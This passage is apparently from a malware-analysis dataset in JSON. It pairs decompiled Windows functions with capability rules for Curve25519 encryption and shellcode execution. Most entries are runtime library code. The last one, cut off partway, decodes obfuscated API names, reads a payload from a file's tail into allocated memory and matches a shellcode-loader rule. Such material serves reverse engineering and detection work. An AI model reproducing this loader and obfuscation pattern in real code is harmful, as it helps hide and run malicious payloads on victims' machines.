        "decompiled_code": "\nuchar (*) [16] fcn.140010318(uchar (*arg1) [16], ulong arg2)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    char *pcVar6;\n    uchar (*pauVar7) [16];\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    char cVar12;\n    char cVar13;\n    char cVar14;\n    uchar auVar11 [16];\n    uchar in_XMM1 [16];\n    uchar auVar15 [16];\n    uint8_t uVar16;\n    \n    pauVar7 = NULL;\n    if (arg2 == 0) {\n        pcVar5 = arg1 & 0xfffffffffffffff0;\n        auVar11 = in_XMM1 & 0x0;\n        cVar10 = SUB161(auVar11 >> 0x40, 0);\n        cVar12 = SUB161(auVar11 >> 0x48, 0);\n        cVar13 = SUB161(auVar11 >> 0x50, 0);\n        cVar14 = SUB161(auVar11 >> 0x58, 0);\n        auVar11 = CONCAT115(-(pcVar5[0xf] == '\\0'), \n                            CONCAT114(-(pcVar5[0xe] == '\\0'), \n                                      CONCAT113(-(pcVar5[0xd] == '\\0'), \n                                                CONCAT112(-(pcVar5[0xc] == '\\0'), \n                                                          CONCAT111(-(pcVar5[0xb] == cVar14), \n                                                                    CONCAT110(-(pcVar5[10] == cVar13), \n                                                                              CONCAT19(-(pcVar5[9] == cVar12), \n                                                                                       CONCAT18(-(pcVar5[8] == cVar10), \n                                                                                                CONCAT17(-(pcVar5[7] ==\n                                                                                                          '\\0'), \n                                                            CONCAT16(-(pcVar5[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar5[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar5[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar5[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar5[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar5[1] == '\\0'), -(*pcVar5 == '\\0'))))))))))))\n                                                         ))));\n        uVar2 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar5[0xf] == '\\0') >> 7) << 0xf) & -1 << (arg1 & 0xf);\n        pcVar6 = pcVar5;\n        if (uVar2 == 0) {\n            do {\n                pcVar5 = pcVar6 + 0x10;\n                auVar11 = CONCAT115(-(pcVar6[0x1f] == '\\0'), \n                                    CONCAT114(-(pcVar6[0x1e] == '\\0'), \n                                              CONCAT113(-(pcVar6[0x1d] == '\\0'), \n                                                        CONCAT112(-(pcVar6[0x1c] == '\\0'), \n                                                                  CONCAT111(-(pcVar6[0x1b] == cVar14), \n                                                                            CONCAT110(-(pcVar6[0x1a] == cVar13), \n                                                                                      CONCAT19(-(pcVar6[0x19] == cVar12)\n                                                                                               , CONCAT18(-(pcVar6[0x18]\n                                                                                                           == cVar10), \n                                                                                                          CONCAT17(-(\n                                                            pcVar6[0x17] == '\\0'), \n                                                            CONCAT16(-(pcVar6[0x16] == '\\0'), \n                                                                     CONCAT15(-(pcVar6[0x15] == '\\0'), \n                                                                              CONCAT14(-(pcVar6[0x14] == '\\0'), \n                                                                                       CONCAT13(-(pcVar6[0x13] == '\\0')\n                                                                                                , CONCAT12(-(pcVar6[0x12\n                                                            ] == '\\0'), \n                                                            CONCAT11(-(pcVar6[0x11] == '\\0'), -(*pcVar5 == '\\0')))))))))\n                                                            )))))));\n                uVar1 = SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar6[0x1f] == '\\0') >> 7) << 0xf;\n                uVar2 = uVar1;\n                pcVar6 = pcVar5;\n            } while (uVar1 == 0);\n        }\n        uVar4 = 0;\n        if (uVar2 != 0) {\n            for (; (uVar2 >> uVar4 & 1) == 0; uVar4 = uVar4 + 1) {\n            }\n        }\n        return pcVar5 + uVar4;\n    }\n    if (*0x14001e018 < 2) {\n        pcVar5 = arg1 & 0xfffffffffffffff0;\n        auVar15 = pshuflw(in_XMM1, ZEXT416((arg2 & 0xff) << 8 | arg2 & 0xff), 0);\n        uVar2 = -1 << (arg1 & 0xf);\n        auVar11 = CONCAT115(-(pcVar5[0xf] == '\\0'), \n                            CONCAT114(-(pcVar5[0xe] == '\\0'), \n                                      CONCAT113(-(pcVar5[0xd] == '\\0'), \n                                                CONCAT112(-(pcVar5[0xc] == '\\0'), \n                                                          CONCAT111(-(pcVar5[0xb] == '\\0'), \n                                                                    CONCAT110(-(pcVar5[10] == '\\0'), \n                                                                              CONCAT19(-(pcVar5[9] == '\\0'), \n                                                                                       CONCAT18(-(pcVar5[8] == '\\0'), \n                                                                                                CONCAT17(-(pcVar5[7] ==\n                                                                                                          '\\0'), \n                                                            CONCAT16(-(pcVar5[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar5[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar5[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar5[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar5[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar5[1] == '\\0'), -(*pcVar5 == '\\0'))))))))))))\n                                                         ))));\n        cVar10 = SUB161(auVar15, 0);\n        cVar12 = SUB161(auVar15 >> 8, 0);\n        cVar13 = SUB161(auVar15 >> 0x10, 0);\n        cVar14 = SUB161(auVar15 >> 0x18, 0);\n        auVar15 = CONCAT115(-(cVar14 == pcVar5[0xf]), \n                            CONCAT114(-(cVar13 == pcVar5[0xe]), \n                                      CONCAT113(-(cVar12 == pcVar5[0xd]), \n                                                CONCAT112(-(cVar10 == pcVar5[0xc]), \n                                                          CONCAT111(-(cVar14 == pcVar5[0xb]), \n                                                                    CONCAT110(-(cVar13 == pcVar5[10]), \n                                                                              CONCAT19(-(cVar12 == pcVar5[9]), \n                                                                                       CONCAT18(-(cVar10 == pcVar5[8]), \n                                                                                                CONCAT17(-(cVar14 ==\n                                                                                                          pcVar5[7]), \n                                                                                                         CONCAT16(-(\n                                                            cVar13 == pcVar5[6]), \n                                                            CONCAT15(-(cVar12 == pcVar5[5]), \n                                                                     CONCAT14(-(cVar10 == pcVar5[4]), \n                                                                              CONCAT13(-(cVar14 == pcVar5[3]), \n                                                                                       CONCAT12(-(cVar13 == pcVar5[2]), \n                                                                                                CONCAT11(-(cVar12 ==\n                                                                                                          pcVar5[1]), \n                                                                                                         -(cVar10 ==\n                                                                                                          *pcVar5)))))))\n                                                            )))))))));\n        uVar4 = (SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(cVar14 == pcVar5[0xf]) >> 7) << 0xf) & uVar2;\n        uVar2 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                 (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                 (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                 (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                 (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                 (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                 (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                 (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(pcVar5[0xf] == '\\0') >> 7) << 0xf) & uVar2;\n        pcVar6 = pcVar5;\n        if (uVar2 == 0) {\n            do {\n                uVar2 = 0x1f;\n                if (uVar4 != 0) {\n                    for (; uVar4 >> uVar2 == 0; uVar2 = uVar2 - 1) {\n                    }\n                }\n                if (uVar4 != 0) {\n                    pauVar7 = pcVar6 + uVar2;\n                }\n                pcVar5 = pcVar6 + 0x10;\n                auVar11 = ZEXT416(CONCAT13(-(pcVar6[0x13] == '\\0'), \n                                           CONCAT12(-(pcVar6[0x12] == '\\0'), \n                                                    CONCAT11(-(pcVar6[0x11] == '\\0'), -(*pcVar5 == '\\0'))))) &\n                          0xffffffffffffffff;\n                uVar16 = -(SUB161(auVar11 >> 0x78, 0) == pcVar6[0x1f]);\n                auVar15 = CONCAT115(uVar16, CONCAT114(-(SUB161(auVar11 >> 0x70, 0) == pcVar6[0x1e]), \n                                                      CONCAT113(-(SUB161(auVar11 >> 0x68, 0) == pcVar6[0x1d]), \n                                                                CONCAT112(-(SUB161(auVar11 >> 0x60, 0) == pcVar6[0x1c])\n                                                                          , CONCAT111(-(SUB161(auVar11 >> 0x58, 0) ==\n                                                                                       pcVar6[0x1b]), \n                                                                                      CONCAT110(-(SUB161(auVar11 >> 0x50\n                                                                                                         , 0) ==\n                                                                                                 pcVar6[0x1a]), \n                                                                                                CONCAT19(-(SUB161(\n                                                            auVar11 >> 0x48, 0) == pcVar6[0x19]), \n                                                            CONCAT18(-(SUB161(auVar11 >> 0x40, 0) == pcVar6[0x18]), \n                                                                     CONCAT17(-(pcVar6[0x17] == '\\0'), \n                                                                              CONCAT16(-(pcVar6[0x16] == '\\0'), \n                                                                                       CONCAT15(-(pcVar6[0x15] == '\\0')\n                                                                                                , CONCAT14(-(pcVar6[0x14\n                                                            ] == '\\0'), SUB164(auVar11, 0)))))))))))));\n                auVar11 = CONCAT115(-(cVar14 == pcVar6[0x1f]), \n                                    CONCAT114(-(cVar13 == pcVar6[0x1e]), \n                                              CONCAT113(-(cVar12 == pcVar6[0x1d]), \n                                                        CONCAT112(-(cVar10 == pcVar6[0x1c]), \n                                                                  CONCAT111(-(cVar14 == pcVar6[0x1b]), \n                                                                            CONCAT110(-(cVar13 == pcVar6[0x1a]), \n                                                                                      CONCAT19(-(cVar12 == pcVar6[0x19])\n                                                                                               , CONCAT18(-(cVar10 ==\n                                                                                                           pcVar6[0x18])\n                                                                                                          , CONCAT17(-(\n                                                            cVar14 == pcVar6[0x17]), \n                                                            CONCAT16(-(cVar13 == pcVar6[0x16]), \n                                                                     CONCAT15(-(cVar12 == pcVar6[0x15]), \n                                                                              CONCAT14(-(cVar10 == pcVar6[0x14]), \n                                                                                       CONCAT13(-(cVar14 == pcVar6[0x13]\n                                                                                                 ), CONCAT12(-(cVar13 ==\n                                                                                                              pcVar6[\n                                                            0x12]), CONCAT11(-(cVar12 == pcVar6[0x11]), \n                                                                             -(cVar10 == *pcVar5))))))))))))))));\n                uVar1 = SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (uVar16 >> 7) << 0xf;\n                uVar2 = uVar1;\n                uVar4 = SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(cVar14 == pcVar6[0x1f]) >> 7) << 0xf;\n                pcVar6 = pcVar5;\n            } while (uVar1 == 0);\n        }\n        uVar4 = uVar4 & (-uVar2 & uVar2) - 1;\n        uVar2 = 0x1f;\n        if (uVar4 != 0) {\n            for (; uVar4 >> uVar2 == 0; uVar2 = uVar2 - 1) {\n            }\n        }\n        if (uVar4 != 0) {\n            pauVar7 = pcVar5 + uVar2;\n        }\n    }\n    else {\n        while( true ) {\n            bVar8 = false;\n            bVar9 = (arg1 & 0xf) == 0;\n            if (bVar9) break;\n            if ((*arg1)[0] == arg2) {\n                pauVar7 = arg1;\n            }\n            if ((*arg1)[0] == '\\0') {\n                return pauVar7;\n            }\n            arg1 = *arg1 + 1;\n        }\n        while( true ) {\n            iVar3 = pcmpistri(ZEXT416(arg2 & 0xff), *arg1, 0x40);\n            if (bVar8) {\n                pauVar7 = *arg1 + iVar3;\n                bVar9 = pauVar7 == NULL;\n                pcmpistri(ZEXT416(arg2 & 0xff), *arg1, 0x40);\n            }\n            if (bVar9) break;\n            bVar8 = 0xffffffffffffffef < arg1;\n            arg1 = arg1[1];\n            bVar9 = arg1 == NULL;\n        }\n    }\n    return pauVar7;\n}\n",
        "token_count": 5226
    },
    "140009d3": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.140009d30(ulong arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    \n    uVar7 = arg1;\n    uVar6 = *0x14001e010 ^ *(uVar7 * 8 + 0x140039680);\n    uVar3 = *0x14001e010 & 0x3f;\n    uVar6 = uVar6 >> uVar3 | uVar6 << 0x40 - uVar3;\n    if (uVar6 != 0xffffffffffffffff) {\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n        if (arg3 != arg4) {\n            do {\n                uVar6 = *arg3;\n                iVar5 = *(uVar6 * 8 + 0x1400395e0);\n                if (iVar5 == 0) {\n                    arg1_00 = *(uVar6 * 8 + 0x1400135e0);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0);\n                    if (iVar5 == 0) {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (((iVar4 == 0x57) && (iVar4 = fcn.140006a60(arg1_00, L\"api-ms-\", 7),  iVar4 != 0)) &&\n                           (iVar4 = fcn.140006a60(arg1_00, L\"ext-ms-\", 7),  iVar4 != 0)) {\n                            iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0, 0);\n                        }\n                        else {\n                            iVar5 = 0;\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        piVar1 = uVar6 * 8 + 0x1400395e0;\n                        iVar2 = *piVar1;\n                        *piVar1 = iVar5;\n                        if (iVar2 != 0) {\n                            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n                        }\n                        goto code_r0x000140009e62;\n                    }\n                    *(uVar6 * 8 + 0x1400395e0) = 0xffffffffffffffff;\n                }\n                else if (iVar5 != -1) {\ncode_r0x000140009e62:\n                    if (iVar5 != 0) goto code_r0x000140009e7d;\n                }\n                arg3 = arg3 + 1;\n            } while (arg3 != arg4);\n        }\n        iVar5 = 0;\ncode_r0x000140009e7d:\n        if ((iVar5 != 0) && (uVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar5, arg2),  uVar6 != 0)) {\n            uVar3 = 0x40 - (*0x14001e010 & 0x3f) & 0x3f;\n            *(uVar7 * 8 + 0x140039680) = (uVar6 >> uVar3 | uVar6 << 0x40 - uVar3) ^ *0x14001e010;\n            return uVar6;\n        }\n        uVar3 = 0x40 - (*0x14001e010 & 0x3f) & 0x3f;\n        *(uVar7 * 8 + 0x140039680) = (0xffffffffffffffffU >> uVar3 | -1 << 0x40 - uVar3) ^ *0x14001e010;\n    }\n    return 0;\n}\n",
        "token_count": 872
    },
    "14000a37": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.14000a370(ulong noname_0, uint32_t *arg2, ulong noname_2, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    \n    fcn.1400089e0(*arg2);\n    uVar1 = *0x14001e010 & 0x3f;\n    uVar2 = *0x14001e010 ^ *0x1400397a8;\n    fcn.140008a34(*arg4);\n    return uVar2 >> uVar1 | uVar2 << 0x40 - uVar1;\n}\n",
        "token_count": 146
    },
    "14000aba": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.14000aba4(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00014000abc4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(*((arg1 >> 6) * 8 + 0x140038f40) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 102
    },
    "14000abc": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid fcn.14000abcc(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x00014000abec. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*((arg1 >> 6) * 8 + 0x140038f40) + (arg1 & 0x3f) * 0x48);\n    return;\n}\n",
        "token_count": 103
    },
    "14000f05": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nint64_t fcn.14000f058(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    int64_t iStackX32;\n    \n    iVar4 = fcn.14000acb0(arg1 & 0xffffffff);\n    if (iVar4 == -1) {\n        puVar5 = fcn.1400073e0();\n        *puVar5 = 9;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(iVar4, arg2, &iStackX32, arg3);\n        if (iVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.140007370(uVar3);\n        }\n        else if (iStackX32 != -1) {\n            puVar1 = *((arg1 >> 6) * 8 + 0x140038f40) + 0x38 + (arg1 & 0x3f) * 0x48;\n            *puVar1 = *puVar1 & 0xfd;\n            return iStackX32;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 291
    },
    "14000f92": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong fcn.14000f92c(int64_t arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    uint32_t auStackX8 [2];\n    uchar auStackX16 [8];\n    uint32_t auStackX24 [2];\n    uint32_t auStackX32 [2];\n    uint32_t *apuStack24 [3];\n    \n    auStackX8[0] = arg1;\n    if (auStackX8[0] == 0xfffffffe) {\n        puVar1 = fcn.1400073c0(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.1400073e0();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < auStackX8[0]) && (auStackX8[0] < *0x140039340)) &&\n           (arg1 = (auStackX8[0] & 0x3f) * 9, \n           (*(*((auStackX8[0] >> 6) * 8 + 0x140038f40) + 0x38 + (auStackX8[0] & 0x3f) * 0x48) & 1) != 0)) {\n            apuStack24[0] = auStackX8;\n            auStackX24[0] = auStackX8[0];\n            auStackX32[0] = auStackX8[0];\n            uVar2 = fcn.14000f8b8(auStackX16, auStackX32, apuStack24, auStackX24);\n            return uVar2;\n        }\n        puVar1 = fcn.1400073c0(arg1);\n        *puVar1 = 0;\n        puVar1 = fcn.1400073e0();\n        *puVar1 = 9;\n        fcn.1400072c0();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 442
    },
    "14000136": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140001360(ulong param_1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uchar *arg4;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    uchar *puVar9;\n    ulong unaff_R15;\n    uint auStackX8 [2];\n    int64_t aiStackX16 [3];\n    ulong ARG_0;\n    ulong var_1630h;\n    ulong var_1e30h;\n    ulong var_2630h;\n    uchar auStack9472 [520];\n    uchar auStack8952 [16];\n    ulong uStack8936;\n    uint32_t uStack8920;\n    uint32_t uStack8916;\n    uchar auStack8912 [520];\n    uint8_t auStack8392 [16];\n    uchar auStack8376 [16];\n    uint uStack8360;\n    uchar auStack8352 [16];\n    uchar auStack8336 [16];\n    uchar auStack8320 [16];\n    uchar auStack8304 [16];\n    uchar auStack8288 [16];\n    uchar auStack8272 [16];\n    uchar auStack8248 [2048];\n    uchar auStack6200 [2048];\n    uchar auStack4152 [2048];\n    uchar auStack2104 [2048];\n    uint64_t uStack56;\n    ulong uStack40;\n    \n    uStack40 = 0x140001379;\n    iVar2 = fcn.1400101e0();\n    iVar2 = -iVar2;\n    uStack56 = *0x14001e010 ^ &stack0xffffffffffffffe0 + iVar2;\n    uStack8360 = 0x68;\n    uStack8936 = 0;\n    auStack8952 = ZEXT816(0);\n    auStack8352 = ZEXT816(0);\n    auStack8336 = ZEXT816(0);\n    auStack8320 = ZEXT816(0);\n    auStack8304 = ZEXT816(0);\n    auStack8288 = ZEXT816(0);\n    auStack8272 = ZEXT816(0);\n    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400013e3;\n    pcVar3 = fcn.140001130(\"8QLnXjY0bgkb9GEb94eR9E\");\n    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400013f5;\n    iVar1 = (*pcVar3)(param_1, &stack0xffffffffffffefc8, 0x400);\n    if (iVar1 != 0) {\n        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001409;\n        pcVar3 = fcn.140001130(\"nPgpDoispyzwbyj\");\n        *(&stack0x00000010 + iVar2) = 0;\n        *(&stack0x00000008 + iVar2) = 0x80;\n        *(&stack0x00000000 + iVar2) = 3;\n        *(&stack0xffffffffffffffd8 + iVar2) = 0x140001437;\n        iVar4 = (*pcVar3)(&stack0xffffffffffffefc8, 0x80000000, 3, 0);\n        if (iVar4 != -1) {\n            *(&stack0x00002758 + iVar2) = unaff_RSI;\n            *(&stack0x00002720 + iVar2) = unaff_R15;\n            *(&stack0xffffffffffffffd8 + iVar2) = 0x140001460;\n            pcVar3 = fcn.140001130(\"ZyG2eE2J9_W8Eb_Mu5\");\n            *(&stack0xffffffffffffffd8 + iVar2) = 0x140001476;\n            (*pcVar3)(iVar4, 0xfffffdec, 0, 2);\n            *(&stack0xffffffffffffffd8 + iVar2) = 0x140001482;\n            pcVar3 = fcn.140001130(\"2AG8l3TqJ4x9\");\n            *(&stack0x00000000 + iVar2) = 0;\n            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400014a0;\n            (*pcVar3)(iVar4, &stack0xffffffffffffdd28, 0x214, &stack0xffffffffffffdf48);\n            uVar7 = uStack8920;\n            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400014b2;\n            pcVar3 = fcn.140001130(\"SQVpUcbs3U5VOA\");\n            *(&stack0xffffffffffffffd8 + iVar2) = 0x1400014bb;\n            iVar5 = (*pcVar3)(0x40, uVar7);\n            uVar7 = uStack8916;\n            if (iVar5 == 0) {\n                *(&stack0xffffffffffffffd8 + iVar2) = 0x1400014cf;\n                pcVar3 = fcn.140001130(\"_F-4IgsWPdb9ngg\");\n                *(&stack0xffffffffffffffd8 + iVar2) = 0x1400014d4;\n                (*pcVar3)(iVar4);\n            }\n            else {\n                *(&stack0x00002760 + iVar2) = unaff_RDI;\n                *(&stack0xffffffffffffffd8 + iVar2) = 0x1400014f2;\n                pcVar3 = fcn.140001130(\"SQVpUcbs3U5VOA\");\n                *(&stack0xffffffffffffffd8 + iVar2) = 0x1400014fb;\n                iVar6 = (*pcVar3)(0x40, uVar7);\n                if (iVar6 == 0) {\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x14000150f;\n                    pcVar3 = fcn.140001130(\"VJLWc6v05rq-Y\");\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x140001513;\n                    (*pcVar3)(0);\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x14000151f;\n                    pcVar3 = fcn.140001130(\"_F-4IgsWPdb9ngg\");\n                    iVar5 = iVar4;\n                }\n                else {\n                    iVar1 = -0x214 - uStack8916;\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x140001570;\n                    pcVar3 = fcn.140001130(\"ZyG2eE2J9_W8Eb_Mu5\");\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x140001580;\n                    (*pcVar3)(iVar4, iVar1, 0, 2);\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x14000158c;\n                    pcVar3 = fcn.140001130(\"2AG8l3TqJ4x9\");\n                    uVar7 = uStack8916;\n                    *(&stack0x00000000 + iVar2) = 0;\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400015a7;\n                    (*pcVar3)(iVar4, iVar6, uVar7, &stack0xffffffffffffdf48);\n                    iVar1 = (-0x214 - uStack8916) - uStack8920;\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400015c1;\n                    pcVar3 = fcn.140001130(\"ZyG2eE2J9_W8Eb_Mu5\");\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400015d2;\n                    (*pcVar3)(iVar4, iVar1, 0, 2);\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400015de;\n                    pcVar3 = fcn.140001130(\"2AG8l3TqJ4x9\");\n                    uVar7 = uStack8920;\n                    puVar9 = &stack0xffffffffffffdf48;\n                    *(&stack0x00000000 + iVar2) = 0;\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x1400015f9;\n                    (*pcVar3)(iVar4, iVar5, uVar7);\n                    *(&stack0xffffffffffffffd8 + iVar2) = 0x140001605;\n                    pcVar3 = fcn.140001130(\"_F-4IgsWPdb9ngg\");\n                    